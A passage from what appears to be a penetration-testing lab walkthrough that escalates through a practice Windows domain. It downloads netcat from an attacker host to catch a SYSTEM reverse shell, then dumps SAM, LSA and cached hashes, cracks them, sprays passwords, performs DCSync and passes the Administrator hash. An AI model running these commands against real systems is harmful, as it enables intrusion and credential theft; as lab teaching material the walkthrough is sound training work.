    wget 10.0.0.13/nc.exe -o nc.exe
    ```
    
    Copy
    
    Downloads the netcat binary into the tasks folder.
    
    **Why**The service command names this path, so the file has to exist before the service starts.
    
    CLIENT-2 (WinRM)
    
    ```
    sc.exe start agentsvc
    ```
    
    Copy
    
    Starts the service, which runs our command.
    
    **Why**The service manager runs our command as the system account; it then waits for a reply that never comes, which is why the command appears to hang.
    
    CLIENT-2 (SYSTEM)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the identity of the shell that arrived on the listener.
    
    **Why**The answer is the local system account, which is the escalation the service configuration allowed.
    
    **Tip**A service that hangs with a timeout is often a success. Look at your listener before you look at the error code.
    
14. 14Dump the cached domain logons and crack them_56:00_
    
    The raw shell is usable but clumsy: with no line editing, a backspace arrives as an escape sequence and garbles the line. A small package adds line editing to the listener, which makes the rest of the work bearable.
    
    With SYSTEM on the second client, three stores are worth reading. The SAM gives the local account hashes. The LSA secrets give the machine account keys and, more usefully, the cached domain logons: the hashes of the domain accounts that logged on to this machine. One of them belongs to an account we have not seen before, and the cache format is slow to compute but easy to crack when the password is a word with substitutions.
    
    The cached hash is pasted into its own file and attacked with the same wordlist. It falls at once, which gives us a domain password that no spray had tested.
    
    Kali
    
    ```
    apt install rlwrap
    ```
    
    Copy
    
    Installs the line editing wrapper for the reverse shell.
    
    **Why**A bare netcat shell has no history, no arrow keys and no backspace, which makes long commands painful and error prone.
    
    Kali
    
    ```
    netexec smb ips
    ```
    
    Copy
    
    Prints a one line summary of the three internal hosts.
    
    **Why**Before reading secrets, we confirm the addresses and the domain of every host on the list.
    
    Kali
    
    ```
    cat pass
    ```
    
    Copy
    
    Prints the password file.
    
    **Why**The cracked service password is in the list, and the next commands use it by name.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u svc_web -p 'oDr@gon13' --sam
    ```
    
    Copy
    
    Dumps the local SAM hashes from the second client as the service account.
    
    **Why**Local hashes matter for other machines that share a local administrator password, and the dump confirms the account is a local administrator here.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u svc_web -p 'oDr@gon13' --lsa
    ```
    
    Copy
    
    Dumps the LSA secrets from the same host.
    
    **Why**Cached domain logons are stored here, and each one is a domain password hash we can attack offline.
    
    Kali
    
    ```
    gedit mscache2
    ```
    
    Copy
    
    Opens a file to hold the cached hash.
    
    **Why**The cracker needs a file in the right format, so the cached line is pasted into its own file.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt mscache2
    ```
    
    Copy
    
    Attacks the cached hash with the wordlist.
    
    **Why**A cached logon is slower to test than a service ticket, but a human password falls just as quickly.
    
    **Tip**The cached logon hash is bound to the user name, so it cannot be passed as it is. It has to be cracked, which makes the wordlist and the rules the important part.
    
15. 15Spray the new password across the domain_1:00:48_
    
    The cracked password is added to the file, which now holds three passwords. The full spray runs against every account on every host, and this time a new pair appears: the cached account is accepted on the first client over SMB. It is a plain domain user, not an administrator, but it is a second valid identity, and identities are what a domain chain is built from.
    
    WinRM refuses every pair on every host, so a shell is not the next step. RDP shows how far the accounts reach: the given account and the cached account both open a desktop on the first client, and the given account also answers on the second. Knowing where an identity can log on is what decides the next machine to work from.
    
    Kali
    
    ```
    cat pass
    ```
    
    Copy
    
    Prints the password file, which now holds three passwords.
    
    **Why**The new password is confirmed in the file before it is used, because a spray with a missing line looks exactly like a spray that found nothing.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Sprays every account with all three passwords over SMB on the three hosts.
    
    **Why**One run shows which identity opens which machine, and a single hit on a client is enough to continue from that host.
    
    Kali
    
    ```
    netexec winrm ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Repeats the spray over WinRM.
    
    **Why**WinRM would give a clean shell on the host; every pair is refused, which rules that route out for now.
    
    Kali
    
    ```
    netexec rdp ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Repeats the spray over RDP.
    
    **Why**RDP shows the interactive reach of each account, which is the fallback when no shell service answers.
    
    **Tip**A plain domain user with a known password is not a small find. It is an identity that can read shares, request tickets and log on to other hosts.
    
16. 16Replicate the domain and take the Administrator_1:04:36_
    
    The cached account carries a permission that is easy to miss: it may replicate directory changes, which is what a domain controller does when it copies data to another controller. BloodHound shows where it comes from: the account is a member of the group ITSync, and that group holds GetChanges and GetChangesAll over the domain, so the account inherits DCSync through its membership. A tool that speaks the replication protocol can ask for the account database and receive it, and the permission needed is the one this account holds.
    
    Before that, one piece of tidying on the machine we own: the service account is taken out of the local administrators group, so the second client is left closer to how we found it. Then the replication request runs as the cached account and prints the hash of every principal, including the domain Administrator. The Administrator hash is a credential in its own right: we test it against all three hosts, and then open a shell on the controller with the hash instead of a password, which ends the chain with the highest account in the domain.
    
    Kali
    
    ```
    rlwrap nc -lvnp 443
    ```
    
    Copy
    
    Starts a listener with line editing and catches a system shell from the second client.
    
    **Why**The service we hijacked runs our command again at start, so the system shell comes back on a fresh listener.
    
    CLIENT-2 (SYSTEM)
    
    ```
    net localgroup administrators svc_web /del
    ```
    
    Copy
    
    Removes the service account from the local administrators group.
    
    **Why**The group was part of the access we used, and taking it back out leaves the host with one less change from the assessment.
    
    Kali
    
    ```
    impacket-secretsdump 'hack-academy.local'/'pprice':'P@ssw0rd'@'10.0.2.4'
    ```
    
    Copy
    
    Asks the controller to replicate the directory and prints every hash it returns.
    
    **Why**Replication rights on any account are enough to read the whole database, and the output includes the Administrator hash and the krbtgt hash.
    
    Kali
    
    ```
    netexec smb ips -u administrator -H c0ced2de918b4a7c1b9f4efd225dd503
    ```
    
    Copy
    
    Tests the Administrator hash over SMB against all three hosts.
    
    **Why**Pass the hash sends the hash as the credential, so the password never has to be cracked to prove the account works everywhere.
    
    Kali
    
    ```
    evil-winrm -i 10.0.2.4 -u administrator -H c0ced2de918b4a7c1b9f4efd225dd503
    ```
    
    Copy
    
    Opens a PowerShell session on the controller as Administrator using the hash.
    
    **Why**A shell on the controller as the domain Administrator is the end of the chain, and it needs no password at all.
    
    **Tip**DCSync needs the replication permission, not Domain Admin. Check every account you crack for replication rights before you assume the domain is out of reach.
